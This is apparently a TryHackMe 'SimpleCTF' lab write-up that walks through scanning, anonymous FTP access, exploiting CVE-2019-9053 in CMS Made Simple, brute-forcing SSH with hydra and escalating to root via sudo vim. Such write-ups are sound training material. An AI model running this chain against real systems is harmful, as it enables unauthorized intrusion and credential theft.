---
title: TryHackMe | SimpleCTF
author: Zeropio
date: 2022-09-29
categories: [TryHackMe, Rooms]
tags: [thm, linux]
permalink: /tryhackme/simplectf
---

# Foothold

The nmap show:

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.2.17
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
```

We try logging to the ftp as **anonymous**:

```console
zero@pio$ ftp anonymous@10.10.69.153                                                                                    
	Connected to 10.10.69.153.
	220 (vsFTPd 3.0.3)
	230 Login successful.
	Remote system type is UNIX.
	Using binary mode to transfer files.
ftp> ls
	229 Entering Extended Passive Mode (|||41322|)
```

It seems we can access but no execute commands, so we download the whole ftp:

```console
zero@pio$ wget -m --no-passive ftp://anonymous@10.10.69.153
```

There we can find a file: `ForMitch.txt`{: .filepath}:

```console
zero@pio$ cat ForMitch.txt 
	Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

The webserver show a default Apache page, so we can try fuzzing:

```console
zero@pio$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u 'http://10.10.69.153/FUZZ'

	simple                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 159ms]
	server-status           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 105ms]
	                        [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 107ms]
```

Under `/simple/`{: .filepath} we can see they are using CMS Made Simple version 2.2.8. This version is vulnerable to **CVE-2019-9053**. 

---

# Fingerprint

With this [exploit](https://www.exploit-db.com/exploits/46635) we can get an valid user:

```console
zero@pio$ python2 46635.py -u 'http://10.10.69.153/simple/' --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt
```

Now we can use hydra to get a password:

```console
zero@pio$ hydra -l mitch -P /usr/share/seclists/Passwords/Common-Credentials/best110.txt ssh://10.10.69.153 -s 2222

	[2222][ssh] host: 10.10.69.153   login: mitch   password: secret
```

Now we can login in the system.

---

# Privilege Escalation

We can see in the server that we have sudo permission over `vim`. With [GTFObins](https://gtfobins.github.io/gtfobins/vim/#sudo) we can quickly escalate:

```console
$ sudo -l
	User mitch may run the following commands on Machine:
	    (root) NOPASSWD: /usr/bin/vim
$ sudo vim -c ':!/bin/sh'

# whoami
	root
```